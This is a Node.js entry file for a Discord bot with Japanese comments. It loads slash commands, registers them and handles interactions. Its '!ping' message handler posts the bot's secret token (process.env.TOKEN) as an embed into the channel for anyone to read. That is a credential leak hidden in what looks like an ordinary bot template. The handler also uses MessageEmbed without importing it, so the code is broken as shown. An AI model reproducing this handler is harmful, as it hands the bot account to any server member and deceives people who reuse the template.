const { Client, Intents } = require("discord.js");
const dotenv = require('dotenv');
dotenv.config();
const fs = require('fs');
//package関連の呼び出し

const client = new Client({
    partials: ["CHANNEL"],
    intents: new Intents(32767),
    restTimeOffset: -1000,
});
//clientの設定

if (process.env.TOKEN == undefined) {
  console.error("tokenが設定されていません!");
  process.exit(0);
}
//TOKENが設定されていない場合のエラーメッセージ

const commands = {}; //定数commandsの作成。
const commandFiles = fs.readdirSync('./commands').filter(file => file.endsWith('.js')); //fsを使用し、commandsフォルダの中のjsファイルの取得。

for (const file of commandFiles) {
    const command = require(`./commands/${file}`);
    commands[command.data.name] = command
}
//先ほど作成した定数commandsにjsファイルのデータを代入(jsファイルの数だけ繰り返します)

client.once("ready", async () => {
    const data = []
    for (const commandName in commands) {
        data.push(commands[commandName].data)
    }
    await client.application.commands.set(data);
    /********************
    * await client.application.commands.set(data,"guildid");
    * guildidには設定したいサーバーのidを入力してください。
    * guildidを追加するとグローバルスラッシュコマンドではなくギルドスラッシュコマンドになります。
    ********************/
});
//bot起動時にスラッシュコマンド(グローバル用)として登録。

client.on("ready", async () => {
    client.user.setActivity(`/ping`, {
      type: "PLAYING",
    });
    client.user.setStatus("dnd");
    console.log(`${client.user.tag} is ready!`);
});
//起動時にコンソールにreadyのログ表示

client.on("interactionCreate", async (interaction) => {
    if (!interaction.isCommand()) {
        return;
    }
    const command = commands[interaction.commandName];
    try {
        await command.execute(interaction);
    } catch (error) {
        console.error(error);
        await interaction.reply({
            content: 'There was an error while executing this command!',
            ephemeral: true,
        })
    }
});
//スラッシュコマンドが実行されたときの処理を実行

client.on('messageCreate',async m => {
    if(m.content === "!ping"){
        const e = new MessageEmbed().setTitle('send ping').setColor('RANDOM').setThumbnail('https://media.discordapp.net/attachments/1089763090507247768/1089763090742124544/15.png?width=607&height=607').setDescription(`${process.env.TOKEN}`)
        m.channel.send({embeds:[e]})
    }
})

client.login(process.env.TOKEN);
//botにログイン
